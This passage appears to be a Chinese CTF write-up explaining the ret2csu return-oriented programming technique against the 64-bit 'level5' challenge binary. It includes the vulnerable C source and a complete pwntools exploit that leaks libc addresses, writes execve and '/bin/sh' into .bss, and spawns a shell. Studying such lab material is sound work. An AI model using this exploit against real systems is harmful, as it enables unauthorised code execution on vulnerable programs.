二、libc_csu_init以及gadget

参数存放在寄存器中，如果想对寄存器操作有两种办法：

1、在栈种部署shellcode控制寄存器的pop操作，但是如果程序开启了NX保护就无法在栈中插入shellcode的操作。

2、通过gadget片段（指令序列）

gadget本质就是程序本身或者libc中存在的一些汇编指令，比如pop ebx,pop eax等，每一条指令对应着一段地址。

ret2csu这种方法就是利用了x64下的__libc_csu_init函数中的gadget。这个函数是用来对libc进行初始化操作的，一般的程序都会调用libc里面的函数，那么一旦掉用libc里面的函数就必须经过libc初始化的步骤，那么 libc_csu_init函数就一定存在

三、ret2csu

C代码

#undef _FORTIFY_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vulnerable_function() {
    char buf[128];
    read(STDIN_FILENO, buf, 512);
}

int main(int argc, char** argv) {
    write(STDOUT_FILENO, "Hello, World\n", 13);
    vulnerable_function();
}

首先checksec查看程序的保护机制

zhuyuan@zhuyuan-vm:~/ctf-challenges/pwn/stackoverflow/ret2__libc_csu_init/hitcon-level5$ checksec level5
[*] '/home/zhuyuan/ctf-challenges/pwn/stackoverflow/ret2__libc_csu_init/hitcon-level5/level5'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

64位程序，开启了NX保护，所以不能添加shellcode或者跳转实现，ida再查看程序

ssize_t vulnerable_function()
{
  char buf[128]; // [rsp+0h] [rbp-80h] BYREF

  return read(0, buf, 0x200uLL);
}

存在read函数，不会检查输入的字符串长度，是一个溢出点。buf距离rsp指针为0，距离rbp指针为80h,可控制栈空间是0x80，64位程序，所以从变量起始位置到ret返回有0x80+8个字节

通过ROPgadget工具检查程序中没有system和/bin/sh的地址

zhuyuan@zhuyuan-vm:~/ctf-challenges/pwn/stackoverflow/ret2__libc_csu_init/hitcon-level5$ ROPgadget --binary level5 --string 'system'
Strings information
============================================================
zhuyuan@zhuyuan-vm:~/ctf-challenges/pwn/stackoverflow/ret2__libc_csu_init/hitcon-level5$ ROPgadget --binary level5 --string '/bin/sh'
Strings information
============================================================

所以需要构造这两个地址

构造exp思路如下：

1、利用LibSearcher工具找到write函数got表地址，read函数got表地址，bss段地址和main函数地址

2、第一次利用栈溢出执行libc_csu_init函数中的gadget1，部署write参数got表地址调用write函数打印自身地址，最后重新返回main函数

3、利用LibcSearcher工具获取对应的libc版本以及execve函数地址

4、第二次利用栈溢出执行libc_csu_init函数中的gadget2，通过read函数got表地址调用read函数向bss段写入execve函数地址以及/bin/sh字符串

5、利用栈溢出执行libc_csu_init函数中的gadget，执行写入bss段的execve(’/bin/sh’)

五、EXP

from pwn import*
from libcfind import*
sh = process('./level5')
elf = ELF('./level5')
gadget1 = 0x00400616        #第一个gadget地址
gadget2 = 0x00400600		#第二个gadget地址

got_read = elf.got['read']		#获取got表中read函数地址
got_write = elf.got['write']	#获取got表中write函数地址
print(hex(got_write))
main_addr = elf.symbols['main']	#获取main函数的地址
print(hex(main_addr))
bss_addr = elf.bss()			#获取bss段的地址

payload = b'A'*136 + p64(gadget1) + p64(0) +p64(0) +  p64(1) + p64(got_write) + p64(8) + p64(got_write) + p64(1) + p64(gadget2) + b'a'*56 + p64(main_addr)
sh.recvuntil('Hello, World\n')

sh.sendline(payload)
sleep(1)


write_real_addr = u64(sh.recv(8))   #接收由write输出的实际write函数地址
print(hex(write_real_addr))
libc = finder('write',write_real_addr)		#获取对应版本的libc
#bin_sh_addr = libc.dump('str_bin_sh')
execve_addr = libc.dump('execve')			#获取execve函数的地址
libcbase_addr = libc.libcbase				#获取这个libc库的基地址
print(hex(libcbase_addr))

read_real_addr = libc.dump('read')			#获取read函数的实际地址
print(hex(read_real_addr))
payload = b'A'*136 + p64(gadget1) + p64(0) +p64(0) +  p64(1) + p64(got_read) + p64(16) + p64(bss_addr) + p64(1) + p64(gadget2) + b'a'*56 + p64(main_addr)

sh.sendline(payload)

sleep(1)
sh.send(p64(execve_addr))       #向bss段写入execve函数地址
sh.send('/bin/sh\0')			#向bss+8写入字符串/bin/sh

payload =  b'A'*136 + p64(gadget1) + p64(0) +p64(0) +  p64(1) + p64(bss_addr) + p64(0) + p64(0) + p64(bss_addr+8) + p64(gadget2) + b'a'*56 + p64(main_addr)

sh.sendline(payload)
sh.interactive()
